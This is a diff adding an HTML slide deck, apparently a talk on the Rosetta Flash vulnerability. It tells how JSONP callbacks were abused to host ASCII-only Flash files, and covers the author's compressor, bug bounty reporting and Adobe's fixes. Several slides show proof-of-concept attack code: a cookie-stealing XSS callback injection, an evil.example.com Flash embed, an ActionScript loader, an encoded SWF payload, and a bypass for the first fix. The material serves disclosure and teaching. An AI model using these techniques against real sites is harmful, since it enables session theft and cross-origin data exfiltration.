@@ -1,0 +1,634 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Handcrafting ASCII Flash files for fun and profit</title>
+
+		<meta name="description" content="A presentation on the Rosetta Flash vulnerability">
+		<meta name="author" content="Gábor Molnár">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.min.css">
+		<link rel="stylesheet" href="css/theme/night.css" id="theme">
+		<link rel="stylesheet" href="css/custom.css">
+
+		<!-- For syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+		<script>
+			if( window.location.search.match( /print-pdf/gi ) ) {
+				var link = document.createElement( 'link' );
+				link.rel = 'stylesheet';
+				link.type = 'text/css';
+				link.href = 'css/print/pdf.css';
+				document.getElementsByTagName( 'head' )[0].appendChild( link );
+			}
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				<section>
+                    <h3>Handcrafting</h3>
+					<h1>ASCII Flash Files</h1>
+					<h3>for Fun and Profit</h3>
+					<h4>
+						<a href="http://twitter.com/molnar_g">Gábor Molnár</a> @ <a href="http://ukatemi.com/">Ukatemi</a> (a <a href="http://crysys.hu/">CrySyS Lab</a> spin-off)
+                    </h4>
+				</section>
+
+                <section>
+                    <h2>Introduction</h2>
+                    <p>Malware analysis, penetration testing</p>
+                    <p>at <a href="http://ukatemi.com/">Ukatemi Technologies</a>/<a href="http://crysys.hu/">CrySyS Lab</a>.</p>
+                    <p>CTFs with the <a href="https://ctftime.org/team/5347">!SpamAndHex team</a>, bug bounties in free time.</p>
+
+                    <a href="http://ukatemi.com/"><img src="img/ukatemi.png" style="height: 5em; margin-right: 0;"></a><a href="http://crysys.hu/"><img src="img/crysys.jpg" style="height: 5em; margin-left: 0;"></a><a href="https://ctftime.org/team/5347"><img src="img/spamandhex.jpg" style="height: 5em; margin-left: 0;"></a>
+                </section>
+
+                <section>
+                    <h2><a href="http://prezi.com/bugbounty/">Prezi Bug Bounty Program</a></h2>
+                    <img src="img/bug.svg" style="height: 10em;"> <!-- Source: http://pixabay.com/p-41983/ -->
+                    <p>$500/web application bug.</p>
+                    <p class="fragment">2014/04: Spent <strong>two days</strong> hunting bugs → found an interesting one!</p>
+                    <p class="fragment">Then <strong>two weeks</strong> to write a Proof of Concept... not an average <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> bug.</p>
+                </section>
+
+                <section>
+                    <h2>Prezi domains</h2>
+                    <p>prezi.com, search.prezi.com, media.prezi.com, ...</p>
+                    <p>APIs and web app on different domains.</p>
+
+                    <div style="margin-top: 2em" class="fragment">
+                        <h4><a href="http://en.wikipedia.org/wiki/Same-origin_policy">Same-Origin Policy</a></h4>
+                        <p>Can't make HTTP request to a different domain and read the response.</p>
+                    </div>
+
+                    <div style="margin-top: 2em" class="fragment">
+                        <h4><a href="http://www.w3.org/TR/cors/">Cross Origin Resource Sharing (CORS)</a></h4>
+                        <p>Proper solution, but not supported in old browsers.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Common workaround: <a href="http://json-p.org/">JSONP</a></h2>
+                    <p>You <strong>can't read</strong> the API response... <span class="fragment">but you <strong>can execute</strong> it!</span></p>
+                    <div class="fragment">
+                    <pre><code class="html" data-trim>
+&lt;script>
+    function f(response) {
+        alert('The response is: ' + JSON.stringify(response));
+    }
+&lt;/script>
+&lt;script src="https://gs.prezi.com/api/v1/group/4dd5e018/users
+             ?format=jsonp&_callback=f">
+&lt;/script>
+                    </code></pre>
+                    <pre><code class="http" data-trim>
+GET /api/v1/group/4dd5e018/users?format=jsonp&_callback=f HTTP/1.1
+Host: gs.prezi.com
+
+HTTP/1.1 200 OK
+Content-Type: text/javascript
+Content-Length: 27
+
+f(["Joe", "Jack", "Jill"])
+                    </code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>JSONP access control</h2>
+                    <p>Prezi uses <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery#Synchronizer_token_pattern"><strong>CSRF (Cross Site Request Forgery) tokens</strong></a>.</p>
+                    <p>Main domain ↔ API domain <strong>shared secret</strong></p>
+
+                    <p style="margin-top: 1.5em">Main domain scripts can access it, others can't.</p>
+                    <p>JSONP requests must include a CSRF token!</p>
+
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <h4>Bug #1: CSRF tokens were not checked on some APIs</h4>
+                        <p>Consequence: access to certain JSONP APIs from anywhere.</p>
+                        <p>Observation: there are JSONP APIs on the main domain too!</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>JSONP callback name I.</h2>
+                    <p>We can control the first bytes of the response! What to do with it?</p>
+
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <p>Code on attacker.example.com</p>
+                        <pre><code class="javascript" data-trim>
+var html = '&lt;script>alert(document.cookie);&lt;/script>';
+var url = 'https://gs.prezi.com/api/v1/group/4dd5e018/users' +
+          '?format=jsonp&_callback=' + encodeURIComponent(html);
+document.write('&lt;iframe src="' + url + '">&lt;/iframe>');
+                        </code></pre>
+                        <p>Code in the &lt;iframe></p>
+                        <pre><code class="html" data-trim>
+&lt;script>alert(document.cookie);&lt;/script>(["Joe", "Jack", "Jill"])
+                        </code></pre>
+                    </div>
+
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <p><strong>Does not work</strong> because of the Content-Type HTTP header!</p>
+                        <pre><code class="http" data-trim>
+HTTP/1.1 200 OK
+Content-Type: text/javascript
+Content-Length: 72
+
+&lt;script>alert(document.cookie);&lt;/script>(["Joe", "Jack", "Jill"])
+                        </code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>JSONP callback name II.</h2>
+                    <p>Spotted in a Facebook Graph API JSONP response:</p>
+                    <pre><code class="http" data-trim>
+GET /123456/friends?access_token=abcdefg&callback=f
+...
+
+/**/ f({ "data": [{"name": "First Friend", "id": "XXXX" ...
+                    </code></pre>
+                    <p><a href="http://stackoverflow.com/questions/8034515/facebook-graph-api-jsonp-format-what-does-the-in-first-line-signify">
+                        StackOverflow: In Facebook graph API JSONP format,<br> what does the /**/ in first line signify?
+                    </a></p>
+                </section>
+                <section>
+                    <h2>JSONP callback name III.</h2>
+                    <h3>Attack scenario - XSS with Flash!</h3>
+                    <pre><code class="html" data-trim>
+<!-- HTML on evil.example.com -->
+&lt;object type="application/x-shockwave-flash"
+        data="http://graph.facebook.com/api
+              ?callback=[specifically crafted flash bytes]">
+&lt;/object>
+                    </code></pre>
+                    <ol>
+                        <li>Facebook "hosts" a Flash file given by the attacker</li>
+                        <li>Content-Type can be overridden when embeddig Flash!</li>
+                        <li>It is Same Origin with Facebook</li>
+                        <li>Can send HTTP reqests to Facebook API, read responses</li>
+                        <li>Sends data back to attacker</li>
+                    </ol>
+
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <h3>Mitigation</h3>
+                        <p>Start JSONP response with /**/ .</p>
+                        <p>Flash files must begin with "FWS" or "CWS", not /**/ .</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Prezi Bug #2: /**/ is missing</h2>
+                    <p>in some JSONP APIs, that don't check CSRF token either! (<strong>Bug #1</strong>)</p>
+                    <p>Good, let's do a <strong>Proof of Concept</strong>!</p>
+                </section>
+
+                <section>
+                    <h2>Callback name restrictions</h2>
+                    <p>Callback name is usually filtered!</p>
+                    <p><strong>Most websites</strong>: alphanumeric characters: <strong>[0-9A-Za-z]</strong></p>
+                    <p><strong>Prezi</strong>: characters between <strong>0x00 and 0x7f (0-127)</strong></p>
+                    <p class="fragment" style="margin-top: 1.5em">... with <a href="www.djangoproject.com/">Django</a> APIs. <a href="http://www.haskell.org/">Haskell</a> APIs allowed 0x00-0xff <br>
+                       but didn't find them at the time.</p>
+                </section>
+
+                <section>
+                    <h2>0x00 - 0x7f Flash files</h2>
+                    <p>It seems like no one tried to do this yet...</p>
+                    <ol>
+                        <li>Achievable with uncompressed Flash file format ("FWS")</li>
+                        <li>Metadata must conform
+                            <ul>
+                                <li>255 as file size is <strong>not OK</strong> (0x00ff)</li>
+                                <li>256 as file size is <strong>OK</strong> (0x0100)</li>
+                            </ul>
+                        </li>
+                        <li>Bytecode must conform
+                            <ul>
+                                <li>Loop bytecode contains negative indices<br>(jump forward -3 bytes)</li>
+                                <li>So, <strong>can't use loops</strong>.</li>
+                            </ul>
+                        </li>
+                        <li>Let's do a minimal loader only!</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h2>0x00 - 0x7f Flash loader</h2>
+                    <pre><code class="actionscript" data-trim>
+import flash.external.ExternalInterface;
+import flash.utils.ByteArray;
+import flash.display.Loader;
+function parse(binary:ByteArray, string:String) {
+    if (string) {
+        binary.writeByte(string.substr(0,3));
+        parse(binary, string.substr(3));
+    }
+    return binary;
+}
+(new Loader()).loadBytes(
+    parse(new ByteArray(), ExternalInterface.objectID)
+);
+                    </code></pre>
+                    <p>+ manual SWF editing with <a href="http://swfmill.org/">swfmill</a></p>
+                    <pre class="fragment" class="html"><code data-trim>
+&lt;object
+  type="application/x-shockwave-flash"
+  data="http:// ... &_callback=%46%56%53..." &lt;!-- Loader SWF -->
+  name="0670870...">   &lt;!-- SWF to be loaded, octal encoding -->
+  &lt;param name="AllowScriptAccess" value="always">
+&lt;/object>
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h2>Success!?</h2>
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <h3>Flash file URLs can't contain 0x00.</h3>
+                        <p><a href="https://code.google.com/p/chromium/issues/detail?id=356924">Chrome bug</a>, <a href="">Firefox bug</a></p>
+                        <p>Uncompressed Flash files <strong>always contain 0x00 bytes</strong>!</p>
+                    </div>
+
+                    <!--<img class="fragment" src="img/cat-cry.png">-->
+                    <div id="catcry" class="fragment"></div>
+                </section>
+
+                <section>
+                    <h2>Research...</h2>
+                    <p>How to exploit this vulnerability?</p>
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <p>The idea was first published here:</p>
+                        <p><a href="http://quaxio.com/jsonp_handcrafted_flash_files/">Alok Menghrajani - JSONP & handcrafted Flash files</a></p>
+                        <p><strong>Tricks</strong>: file size is ignored, checksum can be forced.</p>
+                        <p><strong>There's no known public exploit.</strong></p>
+                    </div>
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <p>PoC: custom compression algo, 0x03-0x7e, does not do anything</p>
+                        <pre><code data-trim>
+0000000: 4357 536a 6163 6b69 6843 5254 5464 6060  CWSjackihCRTTd``
+0000010: 6030 6006 681a 3b03 437c 517e 7e09 0340  `0`.h.;.C|Q~~..@
+0000020: 323e 2e7e 3e3e 4911 4060 3c0b 3046 0606  2>.~>>I.@`<.0F..
+0000030: 0303 0606 0606 0606 0606 2f61 316f 6b06  ........../a1ok.
+0000040: 0606 0606 0606 0706 0606 404e 0b09 12    ..........@N...
+                        </code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Let's do this in [0-9A-Za-z]!</h2>
+                    <p>Must produce compresssed SWF file.</p>
+                    <p>Custom, generic <a href="https://www.ietf.org/rfc/rfc1950.txt">zlib</a> or
+                        <a href="http://www.7-zip.org/sdk.html">LZMA</a> compressor with ASCII output</p>
+                    <p>→ compress any regular SWF file.</p>
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <p><strong>Chose zlib</strong> for no particular reason...</p>
+                        <p>Zlib is a container format for <a href="https://www.ietf.org/rfc/rfc1951.txt">Deflate</a> compressed data.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Deflate compression algorithm</h2>
+                    <p>Deflated data consists of blocks. Types:</p>
+                    <ol>
+                        <li>Uncompressed block</li>
+                        <li>Huffman coded block with predefined dictionary</li>
+                        <li>Huffman coded block with explicitly defined dictionary</li>
+                        <li style="list-style: none">+ Can use backreferences in 2. and 3.</li>
+                    </ol>
+                    <ol class="fragment" style="margin-top: 1.5em">
+                        <li class="red">Contains the block length on 4 bytes → will contain 0x00</li>
+                        <li class="red">No freedom to tune compression → output won't be ASCII</li>
+                        <li>No reason it could not work...</li>
+                        <li style="list-style: none" class="red">+ Omitting backreferences for simplicity</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h2>Huffman coding</h2>
+                    <p>Huffman table as a dictionary:</p>
+                    <table style="display: inline-block" id="huffman-table-example-1">
+                        <thead>
+                        <tr><th>Symbol</th><th>Code</th></tr>
+                        </thead>
+                        <tbody>
+                        <tr><td>0x41 'A'</td> <td>100</td></tr>
+                        <tr><td>0x42 'B'</td> <td>101</td></tr>
+                        <tr><td>0x43 'C'</td> <td>110</td></tr>
+                        <tr><td>0x44 'D'</td> <td>111</td></tr>
+                        <tr><td>0x45 'E'</td> <td>00</td></tr>
+                        <tr><td>End</td>      <td>01</td></tr>
+                        </tbody>
+                    </table>
+                    <div class="fragment">
+                        <p>Decoding: 0010011101 → 00 100 111 01 → EAD.</p>
+                        <p>Prefix code → unambigous</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Defining a Huffman table</h2>
+                    <h4>in a compact way</h4>
+                    <p>Let's suppose symbols can be ordered.</p>
+                    <p>Shorter codes should be always lower lexicographically.</p>
+                    <p>If code lengths equal, let the preceding symbol have a lower code value.</p>
+                    <div class="fragment">
+                        <p style="font-size: 2em">⇓</p>
+                        <p>Table definition = list of code lengths ordered by symbols</p>
+                        <table style="display: inline-block;" id="huffman-table-example-2">
+                            <thead>
+                            <tr><th>Symbol↓</th><th>Code</th><th>Length</th></tr>
+                            </thead>
+                            <tbody>
+                            <tr><td>0x41 'A'</td> <td>100</td> <td>3</td></tr>
+                            <tr><td>0x42 'B'</td> <td>101</td> <td>3</td></tr>
+                            <tr><td>0x43 'C'</td> <td>110</td> <td>3</td></tr>
+                            <tr><td>0x44 'D'</td> <td>111</td> <td>3</td></tr>
+                            <tr><td>0x45 'E'</td> <td>00</td>  <td>2</td></tr>
+                            <tr><td>End</td>      <td>01</td>  <td>2</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Huffman block in deflate</h2>
+                    <p>Table definition = list of code lengths ordered by symbols</p>
+                    <img src="img/huffman-block.svg" style="width: 80%">
+                </section>
+
+                <section>
+                    <h2>The Plan</h2>
+                    <img src="img/huffman-block-plan.svg" style="width: 80%">
+                    <p class="fragment">At most 2*26+10 = 62 different byte values in a block.</p>
+                    <p class="fragment">Important detail: bit order is reversed in deflate! → rev([0-9A-Za-z])</p>
+                </section>
+
+                <section>
+                    <h2>Generating Table #1</h2>
+                    <p><strong>Example</strong>: compressing "\x01\x03\x08" → "8xdo"</p>
+                    <div>
+                        <table style="display: inline-block;">
+                            <thead>
+                            <tr><th>Sym.↓</th><th>Code</th><th>Rev.</th><th>Len.</th></tr>
+                            </thead>
+                            <tbody>
+                            <tr class="un">   <td>0x00</td> <td>-</td>        <td></td>  <td>0</td> </tr>
+                            <tr class="used"> <td>0x01</td> <td>00011100</td> <td>8</td> <td>8</td> </tr>
+                            <tr>              <td>0x02</td> <td>00011101</td> <td></td>  <td>8</td> </tr>
+                            <tr class="used"> <td>0x03</td> <td>00011110</td> <td>x</td> <td>8</td> </tr>
+                            <tr>              <td>0x04</td> <td>00011111</td> <td></td>  <td>8</td> </tr>
+                            <tr>              <td>0x05</td> <td>00100000</td> <td></td>  <td>8</td> </tr>
+                            <tr>              <td>0x06</td> <td>00100001</td> <td></td>  <td>8</td> </tr>
+                            <tr class="un">   <td>0x07</td> <td>-</td>        <td></td>  <td>0</td> </tr>
+                            <tr class="used"> <td>0x08</td> <td>00100010</td> <td>D</td> <td>8</td> </tr>
+                            </tbody>
+                        </table>
+                        <table style="display: inline-block; margin-left: 2em;" class="fragment" data-fragment-index="0">
+                            <thead>
+                            <tr><th>Sym.↓</th><th>Code</th><th>Rev.</th><th>Len.</th></tr>
+                            </thead>
+                            <tbody>
+                            <tr class="first"><td>0x09</td> <td>000000</td>   <td></td>  <td>6</td> </tr>
+                            <tr class="first"><td>...</td>  <td></td>         <td></td>  <td>6</td> </tr>
+                            <tr class="first"><td>0x0F</td> <td>000110</td>   <td></td>  <td>6</td> </tr>
+                            <tr class="un">   <td>...</td>  <td></td>         <td></td>  <td>0</td> </tr>
+                            <tr>              <td>0x2D</td> <td>00100011</td> <td></td>  <td>8</td> </tr>
+                            <tr>              <td>...</td>  <td></td>         <td></td>  <td>8</td> </tr>
+                            <tr class="used"> <td>0x100</td><td>11110110</td> <td>o</td> <td>8</td> </tr>
+                            <tr class="last"> <td>...</td>  <td></td>         <td></td>  <td>8</td> </tr>
+                            <tr class="un">   <td>...</td>  <td></td>         <td></td>  <td>0</td> </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <p><span class="used">Actually used code.</span> <span class="un">Unallocated.</span> <span>Padding.</span></p>
+                    <p class="first fragment" data-fragment-index="1">These make the first 8 bit code valid ASCII (00011100) by allocating every lower value (remember: shorter codes are always lower).</p>
+                    <p class="last fragment" data-fragment-index="1">Allocate the last codes until 11111111 to make the table complete.</p>
+                </section>
+
+                <section>
+                    <h2>Designing Table #2</h2>
+                    <p>Input = Table #1 definition values = lot of 0, 6, 8</p>
+                    <table style="display: inline-block;">
+                        <thead>
+                        <tr><th>Sym.↓</th><th>Code</th><th>Len.</th></tr>
+                        </thead>
+                        <tbody>
+                        <tr> <td>0x00</td> <td>1000</td> <td>4</td> </tr>
+                        <tr> <td>...</td>  <td></td>     <td></td>  </tr>
+                        <tr> <td>0x06</td> <td>1010</td> <td>4</td> </tr>
+                        <tr> <td>...</td>  <td></td>     <td></td>  </tr>
+                        <tr> <td>0x08</td> <td>1011</td> <td>4</td> </tr>
+                        <tr> <td>...</td>  <td></td>     <td></td> </tr>
+                        </tbody>
+                    </table>
+                    <p>Fill the holes to make the whole table <strong>ASCII</strong> and <strong>complete</strong>.</p>
+                    <p class="fragment">Every combination is ASCII <strong>if starting with -2 bit offset</strong>!</p>
+                    <p class="fragment">Table #1 def. needs to end at 0 bit offset: need an <strong>end sequence</strong>.</p>
+                </section>
+
+                <section>
+                    <h2>The Compressor</h2>
+                    <p>In the end, two modes:</p>
+                    <p>1. can compress <strong>anything, large output</strong> (just described)</p>
+                    <p>2. can compress <strong>most inputs, optimized output</strong></p>
+                    <p class="fragment" style="margin-top: 1.5em">Published the compressor as <a href="https://github.com/molnarg/ascii-zip">ascii-zip</a> on GitHub.<br>
+                        See the code for the missing details, optimizations.
+                    </p>
+                </section>
+
+                <section>
+                    <h2>The final ASCII Flash loader</h2>
+                    <pre><code class="actionscript" data-trim>
+import flash.external.ExternalInterface;
+import flash.utils.ByteArray;
+import flash.display.Loader;
+private var objectID, slice = new ByteArray();
+for (objectID = ExternalInterface.objectID; objectID;
+     objectID = objectID.slice(3)) {
+    slice.writeByte(objectID.slice(0, 3));
+}
+(new Loader()).loadBytes(slice);
+                    </code></pre>
+                    <pre class="fragment"><code data-trim style="font-size: 87.5%; word-wrap: break-word; white-space: normal;">
+CWSA7000hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtWGDtGDGwwwDDGDG0Gt0GDGwtGDG0sDttwwwDG33w0sDDt03G33333sDfBDIHTOHHoKHBhHZLxHHHrlbhHHtHRHXXHHHdHDuYAENjmENDaqfvjmENyDjmENJYYfmLzMENYQfaFQENYnfVNx1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwwEDG3w0sG0stDDGtw0GDDwwwt3wt333333w03333gFPaEIQSNvTnmAqICTcsacSCtiUAcYVsSyUcliUAcYVIkSICMAULiUAcYVq9D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwuG333swG033GDtpDtDtDGDD33333s03333sdFPOwWgotOOOOOOOwodFhfhFtFLFlHLTXXTXxT8D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7kiudIbEAt33swwEGDDtDG0GGDDwwwDt0wDGwwGG0sDDt033333GDt333swwv3sFPDtdtthLtDdthTthxthXXHHHHhHHHHHHhHXhHHHHXhXhXHXhHhiOUOsxCxHwWhsXKTgtSXhsDCDHshghSLhmHHhDXHhEOUoZQHHshghoeXehMdXwSlhsXkhehMdhwSXhXmHH5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwGNqdIbe133333333333333333sUUef03gfzA8880HUAH
+                    </code></pre>
+                    <pre class="fragment" class="html"><code data-trim>
+&lt;object
+    type="application/x-shockwave-flash"
+    data="http://good.example.com/api?callback=CWSA7000h..."
+    name="06708708300906601300000012021815708607511102...">
+    &lt;param name="AllowScriptAccess" value="always">
+&lt;/object>
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h2>Success!?</h2>
+                    <p class="fragment">No, Prezi fixed the CSRF token bug...</p>
+                    <p class="fragment">What about other websites?</p>
+                    <div class="fragment">
+                        <p>Vulnerable:</p>
+                        <div style="width: 50%; display: inline-block">
+                        google.com
+                        yahoo.com
+                        wikipedia.org
+                        qq.com
+                        taobao.com
+                        linkedin.com
+                        sina.com.cn
+                        twitter.com
+                        amazon.com
+                        hao123.com
+                        163.com
+                        tmall.com
+                        yandex.ru
+                        ebay.com
+                        msn.com
+                        apple.com
+                        paypal.com
+                        mail.ru
+                        instagram.com
+                        tumblr.com
+                        <br> ...
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Reporting</h2>
+                    <a href="https://hackerone.com/internet-bug-bounty"><img src="img/ibb.png"></a>
+                    <p><a href="https://hackerone.com/internet">The Internet</a> or <a href="https://hackerone.com/flash">Flash</a>?</p>
+                    <p>There's a chance that Adobe won't fix it, so The Internet.</p>
+                </section>
+
+                <section>
+                    <h2>Slow progress...</h2>
+                    <p><a href="https://hackerone.com/reports/10373">Reporting</a> and publishing <a href="https://github.com/molnarg/ascii-zip">ascii-zip</a> on 2014/04/29</p>
+                    <p class="fragment">Waiting for 2 weeks</p>
+
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <p><strong>IBB</strong>: It probably qualifies for a bounty. Let's coordinate the notofication of the affected sites.</p>
+                        <p><strong>Me</strong>: I think we should try to contact Adobe first. Will you please contact them? You should have contact to them since they host their Bug Bounty program at IBB.</p>
+                    </div>
+                    <p class="fragment">Waiting for 2 months</p>
+
+                    <p class="fragment" style="margin-top: 1.5em">
+                        <a href="http://miki.it">Michele Spagnuolo</a> from Google publishes
+                        <a href="http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/">Rosetta Flash</a>
+                        on 2014/07/08
+                    </p>
+                </section>
+
+                <section>
+                    <h2>The other side of the story</h2>
+                    <p class="fragment">Michele notices ascii-zip without knowing what was it made for</p>
+                    <p class="fragment">Implements an exploitation tool based on it and Alok's idea.</p>
+                    <p class="fragment">Reports the vulnerability to Adobe (through Internet Bug Bounty!).</p>
+                    <p class="fragment">Adobe pushes out a fix.</p>
+                    <p class="fragment">Publishes the blog post on Rosetta Flash.</p>
+                    <p class="fragment">The bug gets huge media attention.</p>
+                </section>
+
+                <section>
+                    <h2>Bug Bounty Happy End</h2>
+                    <p>Both me and Michele got a $3000 bounty from IBB.</p>
+                    <p>Adobe fixed the bug.</p>
+                    <p>The world has been saved again :)</p>
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <p>Nominated for <a href="http://pwnies.com/nominations/#bestserverbug">Best Server-Side Bug Pwnie Award</a></p>
+                        <img src="img/pwnie.jpg" style="width: 13em">
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Bug Bounty Conclusions</h2>
+                    <p>Don't share code (or parts of it) publicly too early.</p>
+                    <p>Be proactive after reporting. Ping the right person when stuck.</p>
+                    <p>When reporting to programs like IBB, contact the vendor directly too.</p>
+
+                    <p style="margin-top: 1.5em">Bug Bounty Programs: please don't let anyone wait for months.</p>
+                </section>
+
+                <section>
+                    <h2>The fix</h2>
+                    <p>Released on 2014/07/8</p>
+                    <div class="fragment" style="margin-top: 1.5em">
+                        <p><a href="http://miki.it/blog/2014/8/15/adobe-really-fixed-rosetta-flash-today/">Reverse engineered by Googlers</a></p>
+                        <p>Play SWF file only if:</p>
+                        <p>at least one <strong>JSONP-disallowed character</strong> in the first 4096 bytes</p>
+                    </div>
+
+                    <p class="fragment" style="margin-top: 1.5em"><strong>Bypass</strong>: the last character of the checksum can be forced to be '('
+                    </p>
+                </section>
+
+                <section>
+                    <h2>The proper fix</h2>
+                    <p>Released on 2014/08/15</p>
+                    <p style="margin-top: 1.5em">Play SWF file only if:</p>
+                    <p>it has <strong>application/x-shockwave-flash content-type</strong></p>
+                    <p>or at least one <strong>character above 0x7f</strong> in the first 4096 bytes</p>
+                </section>
+
+                <section>
+                    <h1>The End</h1>
+                    <a href=""><img src="img/reddit-logo.png" style="width: 3.5em; margin: 0.5em;"></a>
+                    <a href=""><img src="img/twitter-logo.png" style="width: 3.5em; margin: 0.5em;"></a>
+                    <a href="mailto:gabor@molnar.es"><img src="img/email-logo.png" style="width: 3.5em; margin: 0.5em;"></a>
+                </section>
+			</div>
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.min.js"></script>
+
+		<script>
+
+			// Full list of configuration options available here:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				theme: 'night', // available themes are in /css/theme
+				transition: 'linear', // default/cube/page/concave/zoom/linear/fade/none
+
+				// Parallax scrolling
+				// parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+				// parallaxBackgroundSize: '2100px 900px',
+
+				// Optional libraries used to extend on reveal.js
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
